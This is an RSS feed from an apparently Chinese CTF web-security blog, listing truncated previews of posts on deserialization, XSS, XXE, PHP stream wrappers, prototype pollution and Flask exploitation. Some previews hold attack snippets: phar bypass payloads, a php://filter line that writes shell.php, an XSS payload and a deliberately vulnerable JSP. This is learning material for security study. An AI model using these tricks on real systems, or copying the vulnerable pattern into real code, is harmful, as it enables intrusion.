<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>baozongwi's blog</title><link>https://baozongwi.xyz/tags/%E5%A7%BF%E5%8A%BF/</link><description>baozongwi's blog</description><lastBuildDate>Thu, 12 Feb 2026 20:58:39 +0800</lastBuildDate><atom:link href="https://baozongwi.xyz/tags/%E5%A7%BF%E5%8A%BF/" rel="self" type="application/rss+xml"/><item><title>LinuxAmd64中suid位实现提权</title><link>https://baozongwi.xyz/p/linux-amd64-suid-privilege-escalation/</link><guid>https://baozongwi.xyz/p/linux-amd64-suid-privilege-escalation/</guid><pubDate>Sun, 03 Aug 2025 18:19:43 +0000</pubDate><description>suid位还是花</description><content:encoded>周末和suers一起看了两个提权的题目，出自justCTF2025。
PyEvaline crimes 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include &amp;amp;amp;lt;stdio.h&amp;amp;amp;gt; #include …</content:encoded></item><item><title>动调挖掘pop</title><link>https://baozongwi.xyz/p/dynamic-debugging-pop-discovery/</link><guid>https://baozongwi.xyz/p/dynamic-debugging-pop-discovery/</guid><pubDate>Thu, 08 May 2025 09:42:06 +0000</pubDate><description>PX的时候发现还能这么整</description><content:encoded>前言 今年NCTF的时候有一位师傅来问过我一个很好的问题，当时我自己也不是很会，也不知道该如何去回答这个问题
你们这些大佬都是怎么找到这些新特性的呀，比如这次的原型链污染，我怎么知道要污染这个属性呢
看过我CTFshow之thinkphp专题的文章的师傅应该看的出来，那里面的分析其实我都是静态分析， …</content:encoded></item><item><title>sqlmap使用</title><link>https://baozongwi.xyz/p/sqlmap-usage/</link><guid>https://baozongwi.xyz/p/sqlmap-usage/</guid><pubDate>Mon, 05 May 2025 09:33:13 +0000</pubDate><description>当脚本小子的第一步</description><content:encoded>安装 工具这类的东西肯定是越新越好，所以建议是git安装
1 2 3 git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev cd sqlmap-dev python3 sqlmap.py --help 其 …</content:encoded></item><item><title>ctfshowSql注入</title><link>https://baozongwi.xyz/p/ctfshow-sql-injection/</link><guid>https://baozongwi.xyz/p/ctfshow-sql-injection/</guid><pubDate>Tue, 29 Apr 2025 16:33:07 +0000</pubDate><description>SQL注入练习</description><content:encoded>有一些师傅在去年就开始看我博客了，但是我还弄了一个每月计划，其中我最想写的是mysql注入，当时草草的看了看狗哥写的一篇文章让我看的也很想写，很想记录一下这些东西，顺便练习一下如何去写脚本，恰逢这几天，有不少师傅都在问，我就从ctfshow的SQL注入模块来学习一下一些有趣的姿势，简单的写写exp …</content:encoded></item><item><title>pickle反序列化</title><link>https://baozongwi.xyz/p/pickle-deserialization/</link><guid>https://baozongwi.xyz/p/pickle-deserialization/</guid><pubDate>Fri, 28 Feb 2025 14:01:23 +0000</pubDate><description>pickle吗</description><content:encoded>说在前面 我很早就接触到了这个部分，或者说，距离今日，已经是好几个月了，但是我发现基本市面上的CTF比赛只会考察一点黑名单和reduce方法，所以我对这部分知识就没有那么的热情，现在不知道干嘛，就来学习下
question 开胃的方法 __reduce__ 我做过部分简单的题目，基本都是reduce …</content:encoded></item><item><title>JavaScript原型链污染</title><link>https://baozongwi.xyz/p/javascript-prototype-pollution/</link><guid>https://baozongwi.xyz/p/javascript-prototype-pollution/</guid><pubDate>Fri, 31 Jan 2025 19:25:47 +0000</pubDate><description>pollution_start!</description><content:encoded>0x01 前面很早就知道有这个姿势，但是一直拖欠，包括打ctfshow的时候也是一把锁，后面学了flask的原型链污染觉得很有意思，来学习一下，把坑填了
0x02 prototype&amp;amp;amp;amp;&amp;amp;amp;amp;__proto__ 零基础没关系，我们只要知道属性这个东西就可以，最简单的demo
1 2 3 4 …</content:encoded></item><item><title>php中不出网的FFI</title><link>https://baozongwi.xyz/p/php-non-outbound-ffi/</link><guid>https://baozongwi.xyz/p/php-non-outbound-ffi/</guid><pubDate>Fri, 08 Nov 2024 09:27:18 +0000</pubDate><description>0x01 前言 我知道这个姿势是在暑假的8月份好像是极客大挑战的RCE5？，一直耽搁着到现在来看看
0x02 question 了解 当PHP7.4降临，与他一同前来的还有一个强大拓展PHP FFI
它允许PHP代码调用C语言库中的函数，而无需编写和编译传统的PHP扩展。通过FFI，开发者可以直接在PHP中编写与C库的接口（bindings），而不必使用C语言编写扩展。这极大地简化了扩展PHP功能的过程，并使其更灵活。
For PHP, FFI opens a way to write PHP extensions and bindings to C libraries in pure PHP.
加载C库：可以通过FFI直接加载共享库（如.so或.dll文件）。 定义C函数和类型：在PHP中以字符串的形式定义C语言的函数、结构体、类型等。 调用C函数：一旦定义了C函数，就可以像调用PHP函数一样在PHP中调用它们 FFI::cdef 看不懂啊，那我们看demo，以师傅的例子来讲，我们用PHP的curl，和libcurl来进行对比
首先我们修改ini文件
1 2 extension=ffi ffi.enable=true 然后写demo就发现有很多问题，比如说找不到什么的，然后查了查，只有Linux才行
接下来放出源码
1 2 3 4 5 6 7 8 9 10 11 &amp;amp;lt;?php $url = &amp;amp;#34;https://www.laruence.com/2020/03/11/5475.html&amp;amp;#34;; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_exec($ch); curl_close($ch); 这是不使用FFI的情况</description><content:encoded>0x01 前言 我知道这个姿势是在暑假的8月份好像是极客大挑战的RCE5？，一直耽搁着到现在来看看
0x02 question 了解 当PHP7.4降临，与他一同前来的还有一个强大拓展PHP FFI
它允许PHP代码调用C语言库中的函数，而无需编写和编译传统的PHP扩展。通过FFI，开发者可以直接 …</content:encoded></item><item><title>phar反序列化bypass</title><link>https://baozongwi.xyz/p/phar-deserialization-bypass/</link><guid>https://baozongwi.xyz/p/phar-deserialization-bypass/</guid><pubDate>Sat, 12 Oct 2024 21:28:14 +0000</pubDate><description>0x01 前言 前面学习phar反序列化的时候我就看到有一些绕过姿势，但是感觉太多了，于是想着单写一篇
0x02 question 文件头 修改stub，在其中加入图片头即可
1 $phar-&amp;amp;gt;setStub(&amp;amp;#34;GIF89a&amp;amp;lt;?php __HALT_COMPILER();?&amp;amp;gt;&amp;amp;#34;); 协议 1 2 1、使用filter伪协议来进行绕过 php://filter/read=convert.base64-encode/resource=phar://phar.phar/m.php 1 2 3 4 5 6 7 8 9 10 11 12 13 &amp;amp;lt;?php class Hello{ public $name=&amp;amp;#39;bao&amp;amp;#39;; } @unlink(&amp;amp;#34;phar.phar&amp;amp;#34;); $phar=new Phar(&amp;amp;#34;phar.phar&amp;amp;#34;); $phar-&amp;amp;gt;startBuffering(); //开缓冲 $phar-&amp;amp;gt;setStub(&amp;amp;#34;GIF89a&amp;amp;lt;?php __HALT_COMPILER();?&amp;amp;gt;&amp;amp;#34;); $o=new Hello(); $phar-&amp;amp;gt;setMetadata($o); $phar-&amp;amp;gt;addFromString(&amp;amp;#34;m.php&amp;amp;#34;,&amp;amp;#34;&amp;amp;lt;?php system(&amp;amp;#39;dir&amp;amp;#39;); ?&amp;amp;gt;&amp;amp;#34;); //写入m.php $phar-&amp;amp;gt;stopBuffering(); //关缓冲 ?&amp;amp;gt; 1 2 &amp;amp;lt;?php include(&amp;amp;#39;php://filter/read=convert.base64-encode/resource=phar://phar.phar/m.php&amp;amp;#39;); 2、使用bzip2协议来进行绕过
这里还是正常生成一个phar文件，只不过要进行处理一下
1 2 3 bzip2 -k phar.phar compress.bzip2://phar://phar.phar/m.php 3、使用zlib协议进行绕过</description><content:encoded>0x01 前言 前面学习phar反序列化的时候我就看到有一些绕过姿势，但是感觉太多了，于是想着单写一篇
0x02 question 文件头 修改stub，在其中加入图片头即可
1 $phar-&amp;amp;amp;gt;setStub(&amp;amp;amp;#34;GIF89a&amp;amp;amp;lt;?php …</content:encoded></item><item><title>flask原型链污染</title><link>https://baozongwi.xyz/p/flask-prototype-pollution/</link><guid>https://baozongwi.xyz/p/flask-prototype-pollution/</guid><pubDate>Thu, 03 Oct 2024 16:57:12 +0000</pubDate><description>0x01 前言 baseCTF里面的那几道我都是现学现做，只是知道污染怎么操作，并不知道为啥可以污染，这次让我彻底弄懂它！
0x02 question 父子类的继承 概念 父类是被继承的类，也称为基类或超类。父类中的属性和方法会被子类继承。
子类是从父类继承而来的类，也称为派生类。子类可以拥有父类的所有属性和方法，还可以添加新的属性和方法，或者重写父类的方法。
同时还有几个重要方法，这里直接引用一位师傅所写的
在Python中，定义类是通过class关键字，class后面紧接着是类名，紧接着是(object)，表示该类是从哪个类继承下来的，所有类的本源都是object类 可以自由地给一个实例变量绑定属性，像js 由于类可以起到模板的作用，因此，可以在创建实例的时候，把一些我们认为必须绑定的属性强制填写进去。通过定义一个特殊的__init__方法，在创建实例的时候，就把类内置的属性绑上 注意到__init__方法的第一个参数永远是self，表示创建的实例本身，因此，在__init__方法内部，就可以把各种属性绑定到self，因为self就指向创建的实例本身。 当我们定义了一个类属性后，这个属性虽然归类所有，但类的所有实例都可以访问到 判断一个变量是否是某个类型可以用isinstance()判断。 普通继承 在子类中，你可以使用 super() 函数来调用父类的方法。这在子类需要扩展而不是完全重写父类方法时特别有用。
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 class Animal: def __init__(self, name): self.name = name def speak(self): raise NotImplementedError(&amp;amp;#34;Subclass must implement this abstract method&amp;amp;#34;) def eat(self): print(f&amp;amp;#34;{self.name} is eating.&amp;amp;#34;) class Dog(Animal): def __init__(self, name, breed): super().__init__(name) # 调用父类的构造函数 self.breed = breed def speak(self): print(f&amp;amp;#34;{self.name} says Woof!&amp;amp;#34;) def fetch(self): print(f&amp;amp;#34;{self.name} is fetching the ball.&amp;amp;#34;) class Cat(Animal): def __init__(self, name, color): super().__init__(name) # 调用父类的构造函数 self.color = color def speak(self): super().speak() # 调用父类的 speak 方法 print(f&amp;amp;#34;{self.name} says Meow!&amp;amp;#34;) def scratch(self): print(f&amp;amp;#34;{self.name} is scratching the furniture.&amp;amp;#34;) instance = Cat(&amp;amp;#34;无情&amp;amp;#34;,&amp;amp;#34;black&amp;amp;#34;) print(instance.name) 看看就行感觉没啥好讲的，看就能看懂</description><content:encoded>0x01 前言 baseCTF里面的那几道我都是现学现做，只是知道污染怎么操作，并不知道为啥可以污染，这次让我彻底弄懂它！
0x02 question 父子类的继承 概念 父类是被继承的类，也称为基类或超类。父类中的属性和方法会被子类继承。
子类是从父类继承而来的类，也称为派生类。子类可以拥有父类的 …</content:encoded></item><item><title>深入浅出XSS</title><link>https://baozongwi.xyz/p/xss-in-depth/</link><guid>https://baozongwi.xyz/p/xss-in-depth/</guid><pubDate>Wed, 25 Sep 2024 08:04:23 +0000</pubDate><description>0x01 前言 最近发现xss的利用还是挺多的，但是自己又处于一个只会用低级payload的水平,所以来学习一下
0x02 question what‘s this 原理 原理就是很简单，类似于注入，我们插入了恶意代码在网页中，并且也被成功解析了
利用场景 浏览器可以执行JavaScript代码（这不是废话吗）。 网页可以显示用户输入的内容。包括但不限于：根据url中的参数渲染网页、预览输入框写好的内容、留言板等其他用户提交的内容等。 那么很显然这是被动的攻击，在之前并不流行，但是现在互联网主要讲求一个&amp;amp;quot;互&amp;amp;quot;,所以自然而然的也可以进行利用了，而能来干什么(最常见的钓鱼)
干啥 窃取cookie或token来获得用户登录态； 劫持流量，把用户正在访问的页面跳转到钓鱼网站； 盗用账户来转账、群发信息等； 利用用户的设备来发起DDOS攻击； demo 这次我们从一个最简单的demo来看看原理
1 2 3 &amp;amp;lt;?php $xss=$_GET[&amp;amp;#39;id&amp;amp;#39;]; echo $xss; 1 ?id=&amp;amp;lt;script&amp;amp;gt;alert(1)&amp;amp;lt;/script&amp;amp;gt; 直接就出现弹窗了，也就是因为我们的恶意代码被解析插入，这样子看其实还是不是很能理解，再来个demo，这个demo也就花了我两个小时吧，艹想哭了
为了更加直观的看到为什么会造成xss，我零基础学了如果使用Tomcat来搭建一个本地服务，其中载入jsp漏洞代码，即可进行xss测试
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 &amp;amp;lt;%@ page language=&amp;amp;#34;java&amp;amp;#34; contentType=&amp;amp;#34;text/html; charset=UTF-8&amp;amp;#34; pageEncoding=&amp;amp;#34;UTF-8&amp;amp;#34;%&amp;amp;gt; &amp;amp;lt;!DOCTYPE html&amp;amp;gt; &amp;amp;lt;html lang=&amp;amp;#34;zh-CN&amp;amp;#34;&amp;amp;gt; &amp;amp;lt;head&amp;amp;gt; &amp;amp;lt;meta charset=&amp;amp;#34;UTF-8&amp;amp;#34;&amp;amp;gt; &amp;amp;lt;meta name=&amp;amp;#34;viewport&amp;amp;#34; content=&amp;amp;#34;width=device-width, initial-scale=1.0&amp;amp;#34;&amp;amp;gt; &amp;amp;lt;title&amp;amp;gt;XSS 测试页面&amp;amp;lt;/title&amp;amp;gt; &amp;amp;lt;/head&amp;amp;gt; &amp;amp;lt;body&amp;amp;gt; &amp;amp;lt;h1&amp;amp;gt;XSS 测试页面&amp;amp;lt;/h1&amp;amp;gt; &amp;amp;lt;form action=&amp;amp;#34;xss_test.jsp&amp;amp;#34; method=&amp;amp;#34;get&amp;amp;#34;&amp;amp;gt; &amp;amp;lt;label for=&amp;amp;#34;message&amp;amp;#34;&amp;amp;gt;输入消息:&amp;amp;lt;/label&amp;amp;gt; &amp;amp;lt;input type=&amp;amp;#34;text&amp;amp;#34; id=&amp;amp;#34;message&amp;amp;#34; name=&amp;amp;#34;message&amp;amp;#34; value=&amp;amp;#34;&amp;amp;lt;%= request.getParameter(&amp;amp;#34;message&amp;amp;#34;) == null ? &amp;amp;#34;&amp;amp;#34; : request.getParameter(&amp;amp;#34;message&amp;amp;#34;) %&amp;amp;gt;&amp;amp;#34;&amp;amp;gt; &amp;amp;lt;button type=&amp;amp;#34;submit&amp;amp;#34;&amp;amp;gt;提交&amp;amp;lt;/button&amp;amp;gt; &amp;amp;lt;/form&amp;amp;gt; &amp;amp;lt;div&amp;amp;gt; 您输入的消息是：&amp;amp;lt;%= request.getParameter(&amp;amp;#34;message&amp;amp;#34;) == null ? &amp;amp;#34;null&amp;amp;#34; : request.getParameter(&amp;amp;#34;message&amp;amp;#34;) %&amp;amp;gt; &amp;amp;lt;/div&amp;amp;gt; &amp;amp;lt;/body&amp;amp;gt; &amp;amp;lt;/html&amp;amp;gt; 先简单的写个xss_test.jsp直接用来测试的</description><content:encoded>0x01 前言 最近发现xss的利用还是挺多的，但是自己又处于一个只会用低级payload的水平,所以来学习一下
0x02 question what‘s this 原理 原理就是很简单，类似于注入，我们插入了恶意代码在网页中，并且也被成功解析了
利用场景 浏览器可以执行JavaScript代码（这 …</content:encoded></item><item><title>php原生类的利用</title><link>https://baozongwi.xyz/p/php-native-class-exploitation/</link><guid>https://baozongwi.xyz/p/php-native-class-exploitation/</guid><pubDate>Thu, 19 Sep 2024 10:09:04 +0000</pubDate><description>0x01 前言 在base和其他部分赛题中遇到了几道原生类的利用刚好，我在计划中也有此打算进行学习以及利用，那么就来看看吧
0x02 question 了解原生类 PHP 作为一门广泛应用于 Web 开发的脚本语言，它的目标是帮助开发者快速构建功能丰富的应用程序。因此，它提供了大量的原生类和函数，通过这些类的调用，PHP 开发者可以轻松处理文件、数据库、网络请求、加密等多种任务，极大地提升了开发效率。
所以说其实是有很多原生类的，包括算法\压缩\json\xml\图像等等，很多，大家可以自己去深入研究，这里的话只提及我们平时能够进行利用，达到任意文件读取\ssrf等攻击手段的原生类
原生类的利用 反射 ReflectionMethod 利用版本：(PHP 5, PHP 7)
ReflectionMethod 是 PHP 提供的反射类之一，用于获取类中某个具体方法的详细信息。
常见方法
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 # 反射调用方法 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;invoke(new [class?]/NULL(静态类),args1,args2); (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;invokeArgs(new [class?]/NULL(静态类,[args1,args2])); # 设置私有/受保护方法 $f = new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;); $f-&amp;amp;gt;setAccessible(true); $f-&amp;amp;gt;invoke(new [class?]); (new [class?])-&amp;amp;gt;[method?](); // 会报错 # 获取函数信息 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;getDeclaringClass() // 获取反射方法的类作为反射类返回 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;isAbstract() // 方法是否是抽象方法 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;isConstructor() // 方法是否是 __construct (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;isDestructor() // 方法是否是 __destruct (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;isFinal() // 方法是否定义了final (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;isPrivate() // 方法是否是私有方法 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;isProtected() // 方法是否是受保护方法 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;isPublic() // 方法是否是公有方法 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;isStatic() // 方法是否是静态方法 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;getDocComment() // 获取方法注释内容 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;getStartLine() // 获取方法开始行号 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;getEndLine() // 获取方法结束行号 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;getExtensionName() // 获取扩展名称 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;getName() // 获取方法名称 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;getNamespaceName() // 获取命名空间名称 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;getNumberOfParameters() // 获取方法参数数量 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;getNumberOfRequiredParameters() // 获取方法必须传入的参数数量 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;getParameters() // 获取方法参数名 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;getShortName() // 获取方法短名 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;getStaticVariables() // 获取方法静态变量 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;hasReturnType() // 方法是否有特定返回类型 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;inNamespace() // 方法是否定义在命名空间 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;isClosure() // 方法是否是匿名函数 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;isDeprecated() // 方法是否弃用 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;isGenerator() // 方法是否是生成器函数 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;isInternal() // 方法是否是内部函数 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;isUserDefined() // 方法是否是用户定义 [2021 CISCN]easy_source</description><content:encoded>0x01 前言 在base和其他部分赛题中遇到了几道原生类的利用刚好，我在计划中也有此打算进行学习以及利用，那么就来看看吧
0x02 question 了解原生类 PHP 作为一门广泛应用于 Web 开发的脚本语言，它的目标是帮助开发者快速构建功能丰富的应用程序。因此，它提供了大量的原生类和函数，通 …</content:encoded></item><item><title>深入浅出xxe</title><link>https://baozongwi.xyz/p/xxe-in-depth/</link><guid>https://baozongwi.xyz/p/xxe-in-depth/</guid><pubDate>Wed, 18 Sep 2024 11:52:15 +0000</pubDate><description>0x01 前言 前两天看了一下xxe的题目，感觉也可以来补补这个基础知识来，为了这个，还浅浅的了解了一下伪协议
0x02 question xml了解 XML（Extensible Markup Language，可扩展标记语言）是一种用于存储和传输数据的标记语言，它类似于 HTML，但更加灵活，主要用于定义数据，而不是显示数据。XML 的设计目标是数据的可移植性、可读性以及易于扩展。也就是和序列化差不多的特点(但是不能混为一谈哦)
XML 文档的结构通常由三部分组成：XML 声明、**DTD(可选的文档类型定义) **和 **元素(内容部分) **。
写一个xml的demo来分析这三个结构
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 &amp;amp;lt;?xml version=&amp;amp;#34;1.0&amp;amp;#34; encoding=&amp;amp;#34;UTF-8&amp;amp;#34;?&amp;amp;gt; &amp;amp;lt;!DOCTYPE bookstore SYSTEM &amp;amp;#34;bookstore.dtd&amp;amp;#34;&amp;amp;gt; &amp;amp;lt;bookstore&amp;amp;gt; &amp;amp;lt;book category=&amp;amp;#34;fiction&amp;amp;#34;&amp;amp;gt; &amp;amp;lt;title lang=&amp;amp;#34;en&amp;amp;#34;&amp;amp;gt;The Great Gatsby&amp;amp;lt;/title&amp;amp;gt; &amp;amp;lt;author&amp;amp;gt;F. Scott Fitzgerald&amp;amp;lt;/author&amp;amp;gt; &amp;amp;lt;year&amp;amp;gt;1925&amp;amp;lt;/year&amp;amp;gt; &amp;amp;lt;price&amp;amp;gt;10.99&amp;amp;lt;/price&amp;amp;gt; &amp;amp;lt;/book&amp;amp;gt; &amp;amp;lt;book category=&amp;amp;#34;non-fiction&amp;amp;#34;&amp;amp;gt; &amp;amp;lt;title lang=&amp;amp;#34;en&amp;amp;#34;&amp;amp;gt;Sapiens: A Brief History of Humankind&amp;amp;lt;/title&amp;amp;gt; &amp;amp;lt;author&amp;amp;gt;Yuval Noah Harari&amp;amp;lt;/author&amp;amp;gt; &amp;amp;lt;year&amp;amp;gt;2011&amp;amp;lt;/year&amp;amp;gt; &amp;amp;lt;price&amp;amp;gt;14.99&amp;amp;lt;/price&amp;amp;gt; &amp;amp;lt;/book&amp;amp;gt; &amp;amp;lt;/bookstore&amp;amp;gt; xml声明 这个东西就类似于，使用C语言编程的</description><content:encoded>0x01 前言 前两天看了一下xxe的题目，感觉也可以来补补这个基础知识来，为了这个，还浅浅的了解了一下伪协议
0x02 question xml了解 XML（Extensible Markup Language，可扩展标记语言）是一种用于存储和传输数据的标记语言，它类似于 HTML，但更加灵活，主 …</content:encoded></item><item><title>php伪协议</title><link>https://baozongwi.xyz/p/php-pseudo-protocols/</link><guid>https://baozongwi.xyz/p/php-pseudo-protocols/</guid><pubDate>Mon, 16 Sep 2024 09:31:51 +0000</pubDate><description>0x01 前言 本来是想看看xxe的，但是发现其中使用协议非常的频繁，刚好我协议也没有总结过，那么来弄完这个弄xxe
0x02 question 概念 数据流 PHP伪协议是一种用于处理各种文件流和资源的机制。通过伪协议，PHP可以访问各种数据源（不仅限于文件），并执行特定任务。这些伪协议常用于文件系统操作、数据流处理以及与网络和数据库的交互。
那么既然提到了是数据流，让我想起来之前有一位师傅问我的问题
1 2 &amp;amp;lt;?php file_put_contents(&amp;amp;#39;php://filter/w=convert.base64-decode/resource=shell.php&amp;amp;#39;,&amp;amp;#39;eHl6&amp;amp;#39;); 这里我们可以利用伪协议来代替文件，进行写入恶意代码，但是为什么呢
数据流的抽象：PHP 的文件处理函数（如 fopen、file_get_contents 等）能够操作的数据并不局限于硬盘上的文件，它们可以操作任意数据流。伪协议让这些函数通过统一的接口来处理各种数据源，比如网络数据、内存数据、压缩数据等等。也就是说我们的伪协议其实并不是文件，只不过在抽象的机制下，可以达到文件的效果，所以细心的师傅发现我们使用伪协议的路径并不是像物理文件一样使用绝对路径
伪协议 1 2 3 4 5 6 7 8 9 10 11 12 file:// — 访问本地文件系统 http:// — 访问 HTTP(s) 网址 ftp:// — 访问 FTP(s) URLs php:// — 访问各个输入/输出流（I/O streams） zlib:// — 压缩流 data:// — 数据（RFC 2397） glob:// — 查找匹配的文件路径模式 phar:// — PHP 归档 ssh2:// — Secure Shell 2 rar:// — RAR ogg:// — 音频流 expect:// — 处理交互式的流 php.ini 在php.ini里有两个重要的参数allow_url_fopen、allow_url_include。
allow_url_fopen:默认值是ON。允许url里的封装协议访问文件； allow_url_include:默认值是OFF。不允许包含url里的封装协议包含文件； test demo.php
1 2 &amp;amp;lt;?php file_get_contents($_GET[&amp;amp;#39;a&amp;amp;#39;]); 写好Demo之后我们挨个把常用的测试一下
php://filter 这个协议应该是最常用的</description><content:encoded>0x01 前言 本来是想看看xxe的，但是发现其中使用协议非常的频繁，刚好我协议也没有总结过，那么来弄完这个弄xxe
0x02 question 概念 数据流 PHP伪协议是一种用于处理各种文件流和资源的机制。通过伪协议，PHP可以访问各种数据源（不仅限于文件），并执行特定任务。这些伪协议常用于文件 …</content:encoded></item><item><title>浅谈session反序列化</title><link>https://baozongwi.xyz/p/session-deserialization-discussion/</link><guid>https://baozongwi.xyz/p/session-deserialization-discussion/</guid><pubDate>Wed, 11 Sep 2024 16:15:57 +0000</pubDate><description>session反序列化</description><content:encoded>0x01 前言 这几天好多奇怪的事情，让我不得不放下一些东西，哎哟，把这个session反序列化拿下就去看GC回收机制
0x02 question 概念 session 本身机制 session（会话）是服务器端用于在用户访问网站时保存信息的一种机制。它允许在多个页面请求之间共享和持久化数据，以便追 …</content:encoded></item><item><title>php反序列化\pop</title><link>https://baozongwi.xyz/p/php-deserialization-pop/</link><guid>https://baozongwi.xyz/p/php-deserialization-pop/</guid><pubDate>Sat, 07 Sep 2024 11:03:57 +0000</pubDate><description>pop入门</description><content:encoded>0x01 前言 总感觉自己的php反序列化不够稳定，简单的那确实直接就秒了，稍微来点东西就卡着，所以我觉得还是很有必要来深入浅出一下
0x02 question 概念 什么是序列化?
serialize()：将变量序列化为字符串。
什么是反序列化?
unserialize()：将序列化后的字符串恢复 …</content:encoded></item><item><title>浅析phar反序列化</title><link>https://baozongwi.xyz/p/phar-deserialization-analysis/</link><guid>https://baozongwi.xyz/p/phar-deserialization-analysis/</guid><pubDate>Thu, 05 Sep 2024 19:28:03 +0000</pubDate><description>phar~</description><content:encoded>0x01 前言 之前在学习php反序列化的时候难免会遇到phar文件的反序列化来恶意载入马，但是始终难以理解这样的姿势，现在再去看，貌似也释然了，这个常用姿势，拿下(以后拿ezphp来骗我也不怕啦)
0x02 question 概念 PHAR 文件（PHP Archive）是一种用于将多个 PHP …</content:encoded></item><item><title>浅析flask内存马</title><link>https://baozongwi.xyz/p/flask-memory-shell-analysis/</link><guid>https://baozongwi.xyz/p/flask-memory-shell-analysis/</guid><pubDate>Mon, 02 Sep 2024 11:03:56 +0000</pubDate><description>你学SSTI不学内存马？</description><content:encoded>0x01 前言 flask中的SSTI注入或许是个好姿势，但是我能不能getshell呢,之前经常阅读联队写的大赛WP,&amp;amp;amp;ldquo;写个脚本打入内存马&amp;amp;amp;rdquo;，好高级，好想学，那今天我来看看这到底是个什么乾坤
0x02 question flask现在已经更新换代了，但是我觉得仍然值得学习， …</content:encoded></item><item><title>flask计算pin值</title><link>https://baozongwi.xyz/p/flask-pin-calculation/</link><guid>https://baozongwi.xyz/p/flask-pin-calculation/</guid><pubDate>Mon, 19 Aug 2024 09:09:00 +0000</pubDate><description>0x01 前言 最近有道flask不仅仅可以绕过黑名单而且开启了debug模式可以进行pin值计算getshell
0x02 原理 pin码是flask在开启debug模式下，进行代码调试模式所需的进入密码，需要正确的PIN码才能进入调试模式,可以理解为自带的webshell
